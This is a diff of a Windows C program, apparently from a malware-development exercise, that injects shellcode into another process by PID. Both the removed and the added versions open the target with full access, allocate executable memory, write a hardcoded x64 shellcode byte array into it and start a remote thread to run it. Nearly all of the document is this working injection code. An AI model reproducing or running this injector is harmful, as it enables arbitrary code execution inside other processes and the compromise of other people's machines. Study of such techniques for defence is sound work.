@@ -1,22 +1,20 @@
 #include <windows.h>
 #include <stdio.h>
 
-int main(int argc, char *argv[])
-{
+/* https://crows-nest.gitbook.io/crows-nest/malware-development/process-injection/shellcode-injection */
 
-    // Open the process with pid
-    printf("injecting into pid: %s...\n", argv[1]);
-    int pid = atoi(argv[1]);
+const char* k = "[+]";
+const char* e = "[-]";
+const char* i = "[*]";
 
-    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
-    if (hProcess == nullptr)
-    {
-        printf("failed to open process or get handle. error: %ld\n", GetLastError());
-        goto CLEANUP;
-    }
+int main(int argc, char* argv[]) {
 
-    // allocate memory in process for shell code and write shellcode to it
-    unsigned char shellcode[] =
+    /* declare and initialize some vars for later use */
+    PVOID rBuffer = NULL;
+    DWORD dwPID = NULL, dwTID = NULL;
+    HANDLE hProcess = NULL, hThread = NULL;
+
+    unsigned char crowPuke[] =
         "\xfc\x48\x83\xe4\xf0\xe8\xcc\x00\x00\x00\x41\x51\x41\x50"
         "\x52\x51\x48\x31\xd2\x56\x65\x48\x8b\x52\x60\x48\x8b\x52"
         "\x18\x48\x8b\x52\x20\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9\x48"
@@ -55,50 +53,55 @@ int main(int argc, char *argv[])
         "\x85\xf6\x75\xb4\x41\xff\xe7\x58\x6a\x00\x59\x49\xc7\xc2"
         "\xf0\xb5\xa2\x56\xff\xd5";
 
-    SIZE_T shellcode_size = sizeof(shellcode);
+    size_t crowPukeSize = sizeof(crowPuke);
 
-    PVOID lpBaseAddress = VirtualAllocEx(hProcess, NULL, shellcode_size, (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE);
-    if (lpBaseAddress == nullptr)
-    {
-        printf("failed to allocate memory on process. error: %ld\n", GetLastError());
-        goto CLEANUP;
+    if (argc < 2) {
+        printf("%s usage: %s <PID>", e, argv[0]);
+        return EXIT_FAILURE;
     }
 
-    if (!WriteProcessMemory(hProcess, lpBaseAddress, shellcode, shellcode_size, 0))
-    {
-        printf("failed to write shellcode to process. error: %ld\n", GetLastError());
-        goto CLEANUP;
-    };
+    dwPID = atoi(argv[1]);
 
-    // create a thread to run the shellcode and wait on it to exit
-    HANDLE hThread = CreateRemoteThreadEx(hProcess, nullptr, 0, (LPTHREAD_START_ROUTINE)lpBaseAddress, NULL, 0, 0, NULL);
-    if (hThread == nullptr)
-    {
-        VirtualFreeEx(hProcess, lpBaseAddress, 0x0, MEM_RELEASE);
-        lpBaseAddress = nullptr;
+    printf("%s trying to get a handle to the process (%ld)\n", i, dwPID);
 
-        printf("failed to create a shellcode thread. error: %ld\n", GetLastError());
-        goto CLEANUP;
+    hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwPID); 
+
+    if (hProcess == NULL) {
+        printf("%s failed to get a handle to the process, error: 0x%lx", e, GetLastError());
+        return EXIT_FAILURE;
     }
 
-    printf("waiting on thread to finish...\n");
+    printf("%s got a handle to the process\n\\---0x%p\n", k, hProcess);
+
+    rBuffer = VirtualAllocEx(hProcess, NULL, crowPukeSize, (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE);
+    printf("%s allocated %zd-bytes to the process memory w/ PAGE_EXECUTE_READWRITE permissions\n", k, crowPukeSize);
+
+    if (rBuffer == NULL) {
+        printf("%s failed to allocate buffer, error: 0x%lx", e, GetLastError());
+        return EXIT_FAILURE;
+    }
+
+    WriteProcessMemory(hProcess, rBuffer, crowPuke, crowPukeSize, NULL);
+    printf("%s wrote %zd-bytes to allocated buffer\n", k, sizeof(crowPuke));
+
+    /* create thread to run our payload */
+    hThread = CreateRemoteThreadEx(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)rBuffer, NULL, 0, 0, &dwTID);
+    
+    if (hThread == NULL) {
+        printf("%s failed to get a handle to the new thread, error: %ld", e, GetLastError());
+        return EXIT_FAILURE;
+    }
+    
+    printf("%s got a handle to the newly-created thread (%ld)\n\\---0x%p\n", k, dwTID, hProcess);
+
+    printf("%s waiting for thread to finish executing\n", i);
     WaitForSingleObject(hThread, INFINITE);
-    printf("thread has finished\n");
+    printf("%s thread finished executing, cleaning up\n", k);
 
-CLEANUP:
+    CloseHandle(hThread);
+    CloseHandle(hProcess);
+    printf("%s finished, see you next time :>", k);
 
-    if (hProcess)
-    {
-        printf("closing handle to process");
-        CloseHandle(hProcess);
-    }
-
-    if (hThread)
-    {
-        printf("closing handle to thread");
-        CloseHandle(hThread);
-    }
-
-    printf("\n\nfinished baller.");
     return EXIT_SUCCESS;
+
 }
